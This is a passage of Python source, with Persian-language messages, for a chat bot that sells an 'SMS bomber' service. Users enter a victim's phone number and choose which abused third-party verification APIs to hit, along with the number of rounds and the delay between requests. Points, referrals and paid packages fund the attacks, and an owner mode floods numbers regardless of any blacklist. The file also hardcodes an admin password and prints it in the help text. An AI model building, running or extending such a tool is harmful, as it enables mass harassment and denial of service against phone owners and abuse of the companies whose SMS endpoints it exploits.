        f"📈 نتایج نهایی:\n"
        f"   - ✅ ارسال‌های موفق: {total_successful_requests}\n"
        f"   - ❌ ارسال‌های ناموفق: {total_failed_requests}"
    )

    if stop_event.is_set():
        final_text = f"🚫 عملیات برای شماره `{phone}` توسط شما لغو شد."

    if chat_id in stop_events:
        del stop_events[chat_id]

    async def send_final_messages():
        try:
            await bot_instance.edit_message_text(chat_id, message_id, final_text)
            await bot_instance.send_message(chat_id, "👇 برای شروع عملیات جدید، از منوی زیر استفاده کنید:", chat_keypad=get_main_menu_keypad())
        except Exception as e:
            print(f"خطا در ارسال پیام نهایی: {e}")

    asyncio.run_coroutine_threadsafe(send_final_messages(), bot_loop)

# ==================== هندلر اصلی ====================

@bot.on_message()
async def message_handler(bot_instance: Robot, msg: Message):
    global user_states
    
    try:
        chat_id = msg.chat_id
        text = msg.text.strip() if msg.text else ""
        callback_data = msg.aux_data.button_id if msg.aux_data and hasattr(msg.aux_data, 'button_id') else None
        # دریافت یوزرنیم از پیام
        username = msg.from_user.username if hasattr(msg, 'from_user') and hasattr(msg.from_user, 'username') else "بدون یوزرنیم"
    except Exception as e:
        print(f"خطا در پردازش پیام: {e}")
        return

    bot_data = load_data()
    is_admin = str(chat_id) == str(ADMIN_CHAT_ID)

    if str(chat_id) in bot_data.get("banned_users", []):
        await msg.reply("🚫 شما توسط مدیر مسدود شده‌اید و مجاز به استفاده از ربات نیستید.")
        return

    # بررسی کاربر جدید و ذخیره یوزرنیم
    is_new_user = str(chat_id) not in bot_data["users"]
    
    if is_new_user:
        bot_data["users"][str(chat_id)] = {
            "join_date": datetime.now().isoformat(), 
            "attack_count": 0, 
            "total_sms_sent": 0,
            "last_active": datetime.now().isoformat(),
            "username": username # ذخیره یوزرنیم
        }
        if str(chat_id) not in bot_data["points"]:
            bot_data["points"][str(chat_id)] = 0
        save_data(bot_data)
        invalidate_cache()
        print(f"کاربر جدید: {chat_id} | یوزرنیم: {username}")
        
        # بررسی کد دعوت در متن ورودی
        ref_code = None
        if text and "ref=" in text:
            ref_code = text.split("ref=")[-1].strip()
            if len(ref_code) == 8:
                success, referrer = process_referral(chat_id, ref_code, send_notification=True)
                if success:
                    referrer_name = bot_data['users'].get(referrer, {}).get('username', referrer)
                    await msg.reply(
                        f"🎉 شما با موفقیت توسط کاربر `{referrer_name}` دعوت شدید!\n"
                        f"⭐ 1 امتیاز به کاربر دعوت‌کننده تعلق گرفت.\n\n"
                        f"🔑 کد دعوت شما: `{generate_referral_code(chat_id)}`\n"
                        f"این کد را به دوستان خود بدهید تا از شما دعوت شوند و امتیاز بگیرید!",
                        chat_keypad=get_main_menu_keypad()
                    )
                    return
        
        if not ref_code or len(ref_code) != 8:
            user_states[chat_id] = {"state": "awaiting_referral_code"}
            await msg.reply(
                f"👋 به ربات اسپمر پیامک خوش آمدید!\n\n"
                f"اگر کد دعوت دارید، آن را وارد کنید.\n"
                f"در غیر این صورت روی دکمه 'رد کردن' بزنید.\n\n"
                f"🔑 کد دعوت شما: `{generate_referral_code(chat_id)}`\n"
                f"این کد را به دوستان خود بدهید تا از شما دعوت شوند و امتیاز بگیرید!",
                chat_keypad=get_referral_code_keypad()
            )
            return
    else:
        # آپدیت یوزرنیم اگر تغییر کرده باشد
        if bot_data["users"][str(chat_id)].get("username") != username and username != "بدون یوزرنیم":
             bot_data["users"][str(chat_id)]["username"] = username
             save_data(bot_data)

    state_info = user_states.get(chat_id, {})
    state = state_info.get("state")

    # پردازش کد دعوت برای کاربران جدید
    if state == "awaiting_referral_code":
        if callback_data == "skip_referral":
            user_states[chat_id] = {}
            await msg.reply(
                f"💣 به ربات اسپمر پیامک پیشرفته خوش آمدید!\n\n"
                f"🔑 کد دعوت شما: `{generate_referral_code(chat_id)}`\n"
                f"این کد را به دوستان خود بدهید تا از شما دعوت شوند و امتیاز بگیرید!",
                chat_keypad=get_main_menu_keypad()
            )
            return
        
        if callback_data == "cancel":
            user_states[chat_id] = {}
            await msg.reply(
                f"💣 به ربات اسپمر پیامک پیشرفته خوش آمدید!",
                chat_keypad=get_main_menu_keypad()
            )
            return
        
        ref_code = text.strip().upper()
        if len(ref_code) == 8:
            success, referrer = process_referral(chat_id, ref_code, send_notification=True)
            if success:
                user_states[chat_id] = {}
                referrer_name = bot_data['users'].get(referrer, {}).get('username', referrer)
                await msg.reply(
                    f"🎉 کد دعوت با موفقیت تایید شد!\n"
                    f"شما توسط کاربر `{referrer_name}` دعوت شده‌اید.\n"
                    f"⭐ 1 امتیاز به کاربر دعوت‌کننده تعلق گرفت.\n\n"
                    f"🔑 کد دعوت شما: `{generate_referral_code(chat_id)}`\n"
                    f"این کد را به دوستان خود بدهید تا از شما دعوت شوند و امتیاز بگیرید!",
                    chat_keypad=get_main_menu_keypad()
                )
                return
            else:
                await msg.reply(
                    "❌ کد دعوت نامعتبر است. لطفاً دوباره تلاش کنید یا روی دکمه 'رد کردن' بزنید.",
                    chat_keypad=get_referral_code_keypad()
                )
                return
        else:
            await msg.reply(
                "❌ کد دعوت باید ۸ کاراکتر باشد. لطفاً دوباره تلاش کنید یا روی دکمه 'رد کردن' بزنید.",
                chat_keypad=get_referral_code_keypad()
            )
            return

    # پردازش کد دعوت برای کاربرانی که از دکمه وارد کردن کد دعوت استفاده کرده‌اند
    if state == "entering_referral_code":
        if callback_data == "cancel":
            user_states[chat_id] = {}
            await msg.reply("↪️ بازگشت به منوی اصلی", chat_keypad=get_main_menu_keypad())
            return
        
        ref_code = text.strip().upper()
        if len(ref_code) == 8:
            success, referrer = process_referral(chat_id, ref_code, send_notification=True)
            if success:
                user_states[chat_id] = {}
                referrer_name = bot_data['users'].get(referrer, {}).get('username', referrer)
                await msg.reply(
                    f"🎉 کد دعوت با موفقیت تایید شد!\n"
                    f"شما توسط کاربر `{referrer_name}` دعوت شده‌اید.\n"
                    f"⭐ 1 امتیاز به کاربر دعوت‌کننده تعلق گرفت.",
                    chat_keypad=get_main_menu_keypad()
                )
                return
            else:
                await msg.reply(
                    "❌ کد دعوت نامعتبر است. لطفاً دوباره تلاش کنید.",
                    chat_keypad=get_back_keypad()
                )
                return
        else:
            await msg.reply(
                "❌ کد دعوت باید ۸ کاراکتر باشد. لطفاً دوباره تلاش کنید.",
                chat_keypad=get_back_keypad()
            )
            return

    if text == "/start" or callback_data == "cancel":
        user_states[chat_id] = {}
        await msg.reply("💣 به ربات اسپمر پیامک پیشرفته خوش آمدید!", chat_keypad=get_main_menu_keypad())
        return

    # دستور ورود به پنل مدیریت
    if text == "shayan9229292":
        user_states[chat_id] = {"state": "admin_panel"}
        await msg.reply("👑 به پنل مدیریت خوش آمدید:", chat_keypad=get_admin_panel_keypad())
        return

    # ============= پنل کاربران عادی =============
    
    # 1. شروع عملیات اسمس بمبر
    if callback_data == "start_bomb":
        user_points = get_user_points(chat_id)
        if user_points <= 0:
            await msg.reply(
                f"⚠️ شما امتیاز کافی برای انجام عملیات ندارید!\n\n"
                f"⭐ امتیاز فعلی: {user_points}\n\n"
                f"برای دریافت امتیاز:\n"
                f"• دریافت پاداش روزانه (3 امتیاز)\n"
                f"• دعوت از دوستان (هر دعوت 1 امتیاز)\n"
                f"• خرید امتیاز از منوی خرید",
                chat_keypad=get_main_menu_keypad()
            )
            return
        
        user_states[chat_id] = {"state": "awaiting_phone"}
        await msg.reply("📞 لطفا شماره تلفن هدف را وارد کنید:\n(مثال: 09123456789 یا +989123456789)", chat_keypad=get_back_keypad())
        return

    # 2. لینک رفرال گیری
    elif callback_data == "referral":
        user_states[chat_id] = {"state": "referral_menu"}
        link = get_user_referral_link(chat_id)
        stats = get_referral_stats(chat_id)
        
        text = (
            f"🔗 لینک ارجاع شما:\n"
            f"`{link}`\n\n"
            f"📊 آمار ارجاع:\n"
            f"⭐ امتیاز: {stats['points'] if stats else 0}\n"
            f"👥 تعداد ارجاع: {stats['referred_count'] if stats else 0}\n"
            f"🔑 کد دعوت: `{stats['code'] if stats else ''}`\n\n"
            f"هر کاربر جدید که با لینک یا کد دعوت شما وارد شود، 1 امتیاز دریافت می‌کنید!"
        )
        await msg.reply(text, chat_keypad=get_referral_keypad())
        return

    # 3. دریافت پاداش روزانه
    elif callback_data == "daily_reward":
        success, message = check_daily_reward(chat_id)
        await msg.reply(message, chat_keypad=get_main_menu_keypad())
        return

    # 4. اسمس بمبر رایگان
    elif callback_data == "free_bomb":
        success, message = check_free_bomb(chat_id)
        if success:
            await msg.reply(
                f"{message}\n\n"
                f"🎯 برای استفاده از بمب رایگان، شماره هدف را وارد کنید:\n"
                f"(حداکثر 50 اسمس بمبر)",
                chat_keypad=get_back_keypad()
            )
            user_states[chat_id] = {"state": "awaiting_free_bomb"}
        else:
            await msg.reply(message, chat_keypad=get_main_menu_keypad())
        return

    # 5. خرید امتیاز
    elif callback_data == "buy_points":
        user_states[chat_id] = {"state": "buy_points"}
        await msg.reply(
            f"💰 خرید امتیاز\n\n"
            f"📋 لیست قیمت‌ها:\n\n"
            f"🔹 پکیج‌های راست:\n"
            f"10⭐ = 20 تومان | 20⭐ = 40 تومان\n"
            f"30⭐ = 60 تومان | 40⭐ = 80 تومان\n"
            f"50⭐ = 100 تومان\n\n"
            f"🔹 پکیج‌های چپ:\n"
            f"100⭐ = 150 تومان | 200⭐ = 300 تومان\n"
            f"300⭐ = 450 تومان | 400⭐ = 600 تومان\n"
            f"500⭐ + 100⭐ جایزه = 700 تومان\n\n"
            f"پس از انتخاب، برای خرید با ادمین در ارتباط باشید:\n"
            f"{ADMIN_USERNAME}",
            chat_keypad=get_buy_points_keypad()
        )
        return

    elif callback_data and callback_data.startswith("buy_"):
        points = int(callback_data.replace("buy_", ""))
        price = BUY_POINTS_PRICES.get(points)
        if price:
            await msg.reply(
                f"✅ شما پکیج {points}⭐ = {price} تومان را انتخاب کردید.\n\n"
                f"💰 لطفاً برای خرید با ادمین در ارتباط باشید:\n"
                f"{ADMIN_USERNAME}\n\n"
                f"📝 پس از واریز مبلغ، امتیاز به حساب شما اضافه می‌شود.",
                chat_keypad=get_main_menu_keypad()
            )
        return

    # 6. وارد کردن کد دعوت
    elif callback_data == "enter_referral":
        user_states[chat_id] = {"state": "entering_referral_code"}
        await msg.reply(
            "🔑 لطفاً کد دعوت ۸ کاراکتری خود را وارد کنید:\n"
            "مثال: `ABCD1234`\n\n"
            "برای بازگشت روی دکمه بازگشت کلیک کنید.",
            chat_keypad=get_back_keypad()
        )
        return

    # ============= بخش‌های دیگر =============
    
    elif callback_data == "my_points":
        user_points = get_user_points(chat_id)
        await msg.reply(
            f"⭐ امتیازات شما\n\n"
            f"امتیاز فعلی: `{user_points}`\n\n"
            f"📋 پلن‌های مصرف امتیاز:\n"
            f"• هر عملیات بمب‌گذاری = 1 امتیاز\n"
            f"• پکیج‌های اسمس بمبر پولی:\n"
            f"  100 SMS = 5⭐ | 200 SMS = 10⭐\n"
            f"  300 SMS = 15⭐ | 400 SMS = 20⭐\n"
            f"  1000 SMS = 25⭐ | 2000 SMS = 50⭐\n"
            f"  3000 SMS = 75⭐ | 4000 SMS = 100⭐",
            chat_keypad=get_main_menu_keypad()
        )
        return

    elif callback_data == "my_stats":
        user_data = bot_data['users'].get(str(chat_id), {})
        join_date = user_data.get('join_date', 'N/A')
        if join_date != 'N/A':
            try:
                join_date = datetime.fromisoformat(join_date).strftime('%Y-%m-%d %H:%M')
            except:
                join_date = 'N/A'
        
        stats = get_referral_stats(chat_id)
        last_active = user_data.get('last_active', 'N/A')
        if last_active != 'N/A':
            try:
                last_active = datetime.fromisoformat(last_active).strftime('%Y-%m-%d %H:%M')
            except:
                last_active = 'N/A'
        
        # نمایش یوزرنیم در آمار شخصی
        current_username = user_data.get('username', 'نامشخص')
        
        stats_text = (
            f"📊 آمار شما\n\n"
            f"🆔 آیدی کاربر: `{chat_id}`\n"
            f"👤 یوزرنیم: `{current_username}`\n"
            f"📅 تاریخ عضویت: `{join_date}`\n"
            f"🕐 آخرین فعالیت: `{last_active}`\n"
            f"💣 تعداد کل حملات: `{user_data.get('attack_count', 0)}`\n"
            f"✉️ مجموع پیامک‌های موفق: `{user_data.get('total_sms_sent', 0)}`\n"
            f"⭐ امتیاز: `{get_user_points(chat_id)}`\n"
            f"👥 تعداد ارجاع: `{stats['referred_count'] if stats else 0}`"
        )
        await msg.reply(stats_text, chat_keypad=get_main_menu_keypad())
        return

    elif callback_data == "blacklist_self":
        user_states[chat_id] = {'state': 'awaiting_blacklist_phone'}
        await msg.reply("🛡 شماره‌ای که می‌خواهید در لیست سیاه شخصی قرار گیرد را وارد کنید. این شماره دیگر توسط هیچ کاربری در این ربات قابل حمله نخواهد بود.", chat_keypad=get_back_keypad())
        return

    elif callback_data == "channel":
        channel_text = (
            "🌟 به جمع ما بپیوندید!\n\n"
            "📢 کانال:\n@ALI_ARMINEH_COM\n\n"
            "💬 گپ دوستانه:\nhttps://rubika.ir/joing/BBEGBIJFH0TPJPZVKHBNGAMEOIGJUHPQ\n\n"
            "🔥 منتظرتون هستیم؛ عضو بشید و با ما همراه باشید ❤️"
        )
        await msg.reply(channel_text, chat_keypad=get_main_menu_keypad())
        return

    elif callback_data == "help":
        help_text = (
            f"❓ راهنمای کامل ربات\n\n"
            f"📌 پنل کاربری:\n"
            f"1️⃣ `💣 شروع عملیات`: برای آغاز حمله جدید - با شماره +98 یا 09\n"
            f"2️⃣ `🎁 اسمس بمبر رایگان`: 50 اسمس بمبر رایگان هر 24 ساعت\n"
            f"3️⃣ `🎁 دریافت پاداش روزانه`: 3 امتیاز رایگان هر 24 ساعت\n"
            f"4️⃣ `🔗 لینک ارجاع`: دریافت لینک دعوت - هر دعوت 1 امتیاز\n"
            f"5️⃣ `🔑 وارد کردن کد دعوت`: وارد کردن کد دعوت دیگران\n"
            f"6️⃣ `💰 خرید امتیاز`: خرید امتیاز با قیمت تومانی\n\n"
            f"📌 پنل مدیریت (دستور shayan9229292):\n"
            f"• آمار کلی کاربران و ارجاعات\n"
            f"• مدیریت کاربران (فعال/غیرفعال/مسدود)\n"
            f"• افزودن امتیاز به کاربران\n"
            f"• پنل مالک (لیست سیاه و بمب نامحدود)\n"
            f"• اطلاعات امنیتی و وب‌سرویس\n\n"
            f"📌 لینک راهنما:\n{bot_data.get('help_link', '')}"
        )
        await msg.reply(help_text, chat_keypad=get_main_menu_keypad())
        return

    # ============= بخش مدیریت =============
    
    # ====== دکمه‌های پنل اصلی ======
    
    # 1. آمار کلی
    if callback_data == "admin_stats":
        users = bot_data.get('users', {})
        total_points = sum(bot_data.get('points', {}).values())
        total_referrals = sum(len(ref.get('referred_users', [])) for ref in bot_data.get('referrals', {}).values())
        active_users = sum(1 for u in users.values() if u.get('attack_count', 0) > 0)
        inactive_users = len(users) - active_users
        
        stats_text = (
            f"📊 آمار کلی ربات\n\n"
            f"👥 تعداد کل کاربران: `{len(users)}`\n"
            f"🟢 کاربران فعال: `{active_users}`\n"
            f"🔴 کاربران غیرفعال: `{inactive_users}`\n"
            f"🚫 کاربران مسدود: `{len(bot_data.get('banned_users', []))}`\n"
            f"⭐ مجموع امتیازات: `{total_points}`\n"
            f"🔗 مجموع ارجاعات: `{total_referrals}`"
        )
        await msg.reply(stats_text, chat_keypad=get_admin_panel_keypad())
        return

    # 2. مدیریت کاربران
    elif callback_data == "admin_users":
        user_states[chat_id] = {"state": "admin_users"}
        await msg.reply("👥 مدیریت کاربران:", chat_keypad=get_admin_users_keypad())
        return

    # 3. افزودن امتیاز
    elif callback_data == "admin_add_points":
        user_states[chat_id] = {"state": "awaiting_add_points"}
        await msg.reply("⭐ وارد کنید:\n`user_id|amount`\nمثال: `u0KMJvN...|10`", chat_keypad=get_back_keypad())
        return

    # 4. پنل مالک
    elif callback_data == "admin_owner_panel":
        user_states[chat_id] = {"state": "owner_panel"}
        await msg.reply("👑 پنل مالک:", chat_keypad=get_owner_panel_keypad())
        return

    # 5. لیست سیاه مالک
    elif callback_data == "admin_blacklist":
        owner_blacklist = bot_data.get('owner_blacklist', [])
        if owner_blacklist:
            text = "🛡 لیست سیاه مالک:\n\n" + "\n".join([f"`{num}`" for num in owner_blacklist[:20]])
            if len(owner_blacklist) > 20:
                text += f"\n... و {len(owner_blacklist) - 20} شماره دیگر"
        else:
            text = "📭 لیست سیاه مالک خالی است."
        await msg.reply(text, chat_keypad=get_admin_panel_keypad())
        return

    # 6. امنیت و وب‌سرویس
    elif callback_data == "admin_security":
        security_text = (
            f"🔒 امنیت و وب‌سرویس‌های ربات\n\n"
            f"🔹 پروتکل امنیتی: HTTPS\n"
            f"🔹 احراز هویت: دو مرحله‌ای\n"
            f"🔹 رمزنگاری: AES-256\n"
            f"🔹 وب‌سرویس‌های استفاده شده:\n"
            f"   • API دیوار\n"
            f"   • API نوبت‌ایر\n"
            f"   • API الوپیک\n"
            f"   • API اسنپ\n"
            f"   • API تپسی\n"
            f"   • و بیش از 40 سرویس دیگر\n\n"
            f"📌 اطلاعات بیشتر:\n{bot_data.get('security_info', '')}"
        )
        await msg.reply(security_text, chat_keypad=get_admin_panel_keypad())
        return

    # ====== دکمه‌های مدیریت کاربران ======
    
    elif callback_data == "admin_user_stats":
        users = bot_data.get('users', {})
        text = "📊 لیست کامل کاربران:\n\n"
        for user_id, user_data in list(users.items())[:20]:
            join_date = user_data.get('join_date', 'N/A')[:10] if user_data.get('join_date') else 'N/A'
            status = "🚫" if user_id in bot_data.get('banned_users', []) else "✅"
            points = bot_data.get('points', {}).get(user_id, 0)
            ref_count = len(bot_data.get('referrals', {}).get(user_id, {}).get('referred_users', []))
            attacks = user_data.get('attack_count', 0)
            username = user_data.get('username', 'بدون یوزرنیم') # دریافت یوزرنیم
            
            # نمایش یوزرنیم در لیست کاربران
            text += f"{status} آیدی: `{user_id}` | یوزرنیم: `{username}` | ⭐{points} | 👥{ref_count} | 💣{attacks}\n"
        
        if len(users) > 20:
            text += f"\n... و {len(users) - 20} کاربر دیگر"
        
        if len(text) > 3500:
            parts = [text[i:i+3500] for i in range(0, len(text), 3500)]
            for part in parts:
                await msg.reply(part, chat_keypad=get_admin_users_keypad())
        else:
            await msg.reply(text, chat_keypad=get_admin_users_keypad())
        return

    elif callback_data == "admin_active_users":
        users = bot_data.get('users', {})
        active_users = [uid for uid, u in users.items() if u.get('attack_count', 0) > 0]
        text = f"🟢 کاربران فعال ({len(active_users)}):\n\n"
        for uid in active_users[:20]:
            u_data = users.get(uid, {})
            username = u_data.get('username', 'بدون یوزرنیم')
            text += f"`{uid}` ({username}) | ⭐{bot_data.get('points', {}).get(uid, 0)}\n"
        if len(active_users) > 20:
            text += f"\n... و {len(active_users) - 20} کاربر دیگر"
        await msg.reply(text, chat_keypad=get_admin_users_keypad())
        return

    elif callback_data == "admin_inactive_users":
        users = bot_data.get('users', {})
        inactive_users = [uid for uid, u in users.items() if u.get('attack_count', 0) == 0]
        text = f"🔴 کاربران غیرفعال ({len(inactive_users)}):\n\n"
        for uid in inactive_users[:20]:
            u_data = users.get(uid, {})
            username = u_data.get('username', 'بدون یوزرنیم')
            text += f"`{uid}` ({username})\n"
        if len(inactive_users) > 20:
            text += f"\n... و {len(inactive_users) - 20} کاربر دیگر"
        await msg.reply(text, chat_keypad=get_admin_users_keypad())
        return

    elif callback_data == "admin_banned_users_list":
        banned = bot_data.get('banned_users', [])
        if banned:
            text = "🚫 لیست کاربران مسدود:\n\n" + "\n".join([f"`{uid}`" for uid in banned[:20]])
            if len(banned) > 20:
                text += f"\n... و {len(banned) - 20} کاربر دیگر"
        else:
            text = "✅ هیچ کاربری مسدود نیست."
        await msg.reply(text, chat_keypad=get_admin_users_keypad())
        return

    elif callback_data == "admin_ban_user":
        user_states[chat_id] = {"state": "awaiting_ban_user_id"}
        await msg.reply("🚫 شناسه عددی کاربر مورد نظر برای مسدود کردن را وارد کنید:", chat_keypad=get_back_keypad())
        return
        
    elif callback_data == "admin_unban_user":
        user_states[chat_id] = {"state": "awaiting_unban_user_id"}
        await msg.reply("✅ شناسه عددی کاربر مورد نظر برای رفع مسدودیت را وارد کنید:", chat_keypad=get_back_keypad())
        return

    # ====== دکمه‌های پنل مالک ======
    
    elif callback_data == "owner_blacklist_add":
        user_states[chat_id] = {"state": "owner_blacklist_add"}
        await msg.reply("➕ شماره مورد نظر برای افزودن به لیست سیاه مالک را وارد کنید:\n(مثال: 09123456789)", chat_keypad=get_back_keypad())
        return

    elif callback_data == "owner_blacklist_remove":
        user_states[chat_id] = {"state": "owner_blacklist_remove"}
        await msg.reply("➖ شماره مورد نظر برای حذف از لیست سیاه مالک را وارد کنید:", chat_keypad=get_back_keypad())
        return

    elif callback_data == "owner_blacklist_list":
        owner_blacklist = bot_data.get('owner_blacklist', [])
        if owner_blacklist:
            text = "📋 لیست سیاه مالک:\n\n" + "\n".join([f"`{num}`" for num in owner_blacklist])
        else:
            text = "📭 لیست سیاه مالک خالی است."
        await msg.reply(text, chat_keypad=get_owner_panel_keypad())
        return

    elif callback_data == "owner_unlimited_bomb":
        user_states[chat_id] = {"state": "owner_unlimited_bomb"}
        await msg.reply(
            "💣 بمب نامحدود مالک\n\n"
            "شماره هدف را وارد کنید:\n"
            "(این شماره حتی اگر در لیست سیاه باشد هم قابل حمله است)",
            chat_keypad=get_back_keypad()
        )
        return

    # ============= بخش دریافت ورودی‌های متنی =============
    
    if state == "awaiting_phone":
        phone_to_bomb = normalize_phone(text)
        if not phone_to_bomb:
            await msg.reply("❌ شماره تلفن نامعتبر است. لطفاً دوباره تلاش کنید.\n(مثال: 09123456789 یا +989123456789)", chat_keypad=get_back_keypad())
            return
            
        if phone_to_bomb in bot_data.get('personal_blacklist', []):
            await msg.reply("🛡 این شماره در لیست سیاه شخصی قرار دارد و قابل حمله نیست.", chat_keypad=get_main_menu_keypad())
            return
            
        cooldown = bot_data['bot_settings']['cooldown_seconds']
        last_time = last_operation.get(chat_id, {}).get(phone_to_bomb)
        if last_time and (time() - last_time) < cooldown:
            remaining = int(cooldown - (time() - last_time))
            await msg.reply(f"⚠️ لطفاً `{remaining}` ثانیه دیگر برای این شماره صبر کنید.", chat_keypad=get_main_menu_keypad())
            return
        
        user_states[chat_id]['phone'] = phone_to_bomb
        user_states[chat_id]['state'] = 'awaiting_attack_type'
        await msg.reply("✔️ شماره تایید شد. حالا نوع حمله را انتخاب کنید:", chat_keypad=get_attack_type_keypad())
        return

    elif state == "awaiting_blacklist_phone":
        phone_to_blacklist = normalize_phone(text)
        if phone_to_blacklist:
            if phone_to_blacklist not in bot_data['personal_blacklist']:
                bot_data['personal_blacklist'].append(phone_to_blacklist)
                save_data(bot_data)
                invalidate_cache()
                await msg.reply(f"✅ شماره `{phone_to_blacklist}` با موفقیت به لیست سیاه شخصی اضافه شد.", chat_keypad=get_main_menu_keypad())
            else:
                await msg.reply("⚠️ این شماره از قبل در لیست سیاه وجود دارد.", chat_keypad=get_main_menu_keypad())
            user_states[chat_id] = {}
        else:
            await msg.reply("❌ شماره نامعتبر است. لطفاً دوباره تلاش کنید.", chat_keypad=get_back_keypad())
        return

    elif state == "awaiting_free_bomb":
        phone_to_bomb = normalize_phone(text)
        if not phone_to_bomb:
            await msg.reply("❌ شماره تلفن نامعتبر است. لطفاً دوباره تلاش کنید.", chat_keypad=get_back_keypad())
            return
        
        all_services = list(get_active_services().items())
        random.shuffle(all_services)
        selected_services = dict(all_services[:10])
        
        await msg.reply("🎯 در حال اجرای بمب رایگان...", chat_keypad=get_cancel_keypad())
        
        progress_message = await msg.reply("⏳ در حال آماده‌سازی...")
        message_id = progress_message.message_id if hasattr(progress_message, 'message_id') else msg.message_id
        
        stop_event = Event()
        stop_events[chat_id] = stop_event
        
        Thread(target=bombing_run_with_progress, args=[main_loop, bot_instance, chat_id, message_id, phone_to_bomb, 0.01, 1, stop_event, selected_services], daemon=True).start()
        user_states[chat_id] = {}
        return

    elif state == "awaiting_ban_user_id":
        user_id = text.strip()
        if user_id in bot_data['users']:
            if user_id not in bot_data['banned_users']:
                bot_data['banned_users'].append(user_id)
                save_data(bot_data)
                invalidate_cache()
                await msg.reply(f"🚫 کاربر `{user_id}` با موفقیت مسدود شد.", chat_keypad=get_admin_users_keypad())
            else:
                await msg.reply(f"⚠️ کاربر `{user_id}` از قبل مسدود شده است.", chat_keypad=get_admin_users_keypad())
        else:
            await msg.reply(f"❌ کاربر با شناسه `{user_id}` یافت نشد.", chat_keypad=get_admin_users_keypad())
        user_states[chat_id] = {}
        return
        
    elif state == "awaiting_unban_user_id":
        user_id = text.strip()
        if user_id in bot_data['banned_users']:
            bot_data['banned_users'].remove(user_id)
            save_data(bot_data)
            invalidate_cache()
            await msg.reply(f"✅ کاربر `{user_id}` با موفقیت از حالت مسدودیت خارج شد.", chat_keypad=get_admin_users_keypad())
        else:
            await msg.reply(f"❌ کاربر `{user_id}` در لیست مسدودین یافت نشد.", chat_keypad=get_admin_users_keypad())
        user_states[chat_id] = {}
        return

    elif state == "awaiting_add_points":
        try:
            parts = text.split("|")
            if len(parts) == 2:
                user_id, amount = parts[0].strip(), int(parts[1].strip())
                if user_id in bot_data['users']:
                    new_points = add_points(user_id, amount)
                    await msg.reply(f"✅ {amount} امتیاز به کاربر `{user_id}` اضافه شد.\nامتیاز جدید: {new_points}", chat_keypad=get_admin_panel_keypad())
                else:
                    await msg.reply(f"❌ کاربر `{user_id}` یافت نشد.", chat_keypad=get_admin_panel_keypad())
            else:
                await msg.reply("❌ فرمت اشتباه. استفاده کنید: `user_id|amount`", chat_keypad=get_admin_panel_keypad())
        except Exception as e:
            await msg.reply(f"❌ خطا: {str(e)}", chat_keypad=get_admin_panel_keypad())
        user_states[chat_id] = {}
        return

    elif state == "owner_blacklist_add":
        phone_to_add = normalize_phone(text)
        if phone_to_add:
            if phone_to_add not in bot_data.get('owner_blacklist', []):
                bot_data['owner_blacklist'].append(phone_to_add)
                save_data(bot_data)
                invalidate_cache()
                await msg.reply(f"✅ شماره `{phone_to_add}` با موفقیت به لیست سیاه مالک اضافه شد.", chat_keypad=get_owner_panel_keypad())
            else:
                await msg.reply(f"⚠️ شماره `{phone_to_add}` از قبل در لیست سیاه است.", chat_keypad=get_owner_panel_keypad())
        else:
            await msg.reply("❌ شماره نامعتبر است.", chat_keypad=get_owner_panel_keypad())
        user_states[chat_id] = {}
        return

    elif state == "owner_blacklist_remove":
        phone_to_remove = normalize_phone(text)
        if phone_to_remove:
            if phone_to_remove in bot_data.get('owner_blacklist', []):
                bot_data['owner_blacklist'].remove(phone_to_remove)
                save_data(bot_data)
                invalidate_cache()
                await msg.reply(f"✅ شماره `{phone_to_remove}` با موفقیت از لیست سیاه مالک حذف شد.", chat_keypad=get_owner_panel_keypad())
            else:
                await msg.reply(f"⚠️ شماره `{phone_to_remove}` در لیست سیاه وجود ندارد.", chat_keypad=get_owner_panel_keypad())
        else:
            await msg.reply("❌ شماره نامعتبر است.", chat_keypad=get_owner_panel_keypad())
        user_states[chat_id] = {}
        return

    elif state == "owner_unlimited_bomb":
        phone_to_bomb = normalize_phone(text)
        if not phone_to_bomb:
            await msg.reply("❌ شماره تلفن نامعتبر است. لطفاً دوباره تلاش کنید.", chat_keypad=get_back_keypad())
            return
        
        await msg.reply("💣 در حال اجرای بمب نامحدود...", chat_keypad=get_cancel_keypad())
        
        progress_message = await msg.reply("⏳ در حال آماده‌سازی...")
        message_id = progress_message.message_id if hasattr(progress_message, 'message_id') else msg.message_id
        
        stop_event = Event()
        stop_events[chat_id] = stop_event
        
        all_services = get_active_services()
        
        Thread(target=bombing_run_with_progress, args=[main_loop, bot_instance, chat_id, message_id, phone_to_bomb, 0.01, 5, stop_event, all_services], daemon=True).start()
        user_states[chat_id] = {}
        return

    # ============= بخش حمله =============
    
    if callback_data == "attack_all":
        if state != "awaiting_attack_type": 
            return
        user_states[chat_id]['selected_services'] = list(get_active_services().keys())
        user_states[chat_id]['state'] = 'awaiting_rounds'
        await msg.reply("🔄 تعداد دورهای تکرار حمله را انتخاب کنید:", chat_keypad=get_rounds_keypad())
        return

    elif callback_data == "attack_select":
        if state != "awaiting_attack_type": 
            return
        user_states[chat_id]['state'] = 'selecting_services'
        user_states[chat_id]['selected_services'] = []
        await msg.reply("🎯 سرویس‌های مورد نظر خود را انتخاب کنید و سپس دکمه 'تایید' را بزنید:", chat_keypad=get_service_selection_keypad(chat_id))
        return

    elif callback_data and callback_data.startswith("select_service_"):
        if state != "selecting_services": 
            return
        service_name = callback_data.replace("select_service_", "")
        selected = user_states[chat_id].get('selected_services', [])
        if service_name in selected:
            selected.remove(service_name)
        else:
            selected.append(service_name)
        user_states[chat_id]['selected_services'] = selected
        await bot_instance.edit_message_text(chat_id, msg.message_id, "🎯 سرویس‌های مورد نظر خود را انتخاب کنید و سپس دکمه 'تایید' را بزنید:", chat_keypad=get_service_selection_keypad(chat_id))
        return

    elif callback_data == "confirm_service_selection":
        if state != "selecting_services": 
            return
        if not user_states[chat_id].get('selected_services'):
            await msg.reply("⚠️ شما هیچ سرویسی را انتخاب نکرده‌اید!", chat_keypad=get_service_selection_keypad(chat_id))
            return
        user_states[chat_id]['state'] = 'awaiting_rounds'
        await msg.reply("🔄 تعداد دورهای تکرار حمله را انتخاب کنید:", chat_keypad=get_rounds_keypad())
        return

    elif callback_data and "rounds_" in callback_data:
        if state != 'awaiting_rounds': 
            return
        user_states[chat_id]['rounds'] = int(callback_data.split('_')[1])
        user_states[chat_id]['state'] = 'awaiting_intensity'
        await msg.reply("⚡️ شدت حمله را انتخاب کنید (زمان بین هر درخواست):", chat_keypad=get_intensity_keypad())
        return

    elif callback_data and "delay_" in callback_data:
        if state != 'awaiting_intensity': 
            return
        user_states[chat_id]['delay'] = float(callback_data.split('_')[1])
        user_states[chat_id]['state'] = 'awaiting_confirmation'
        
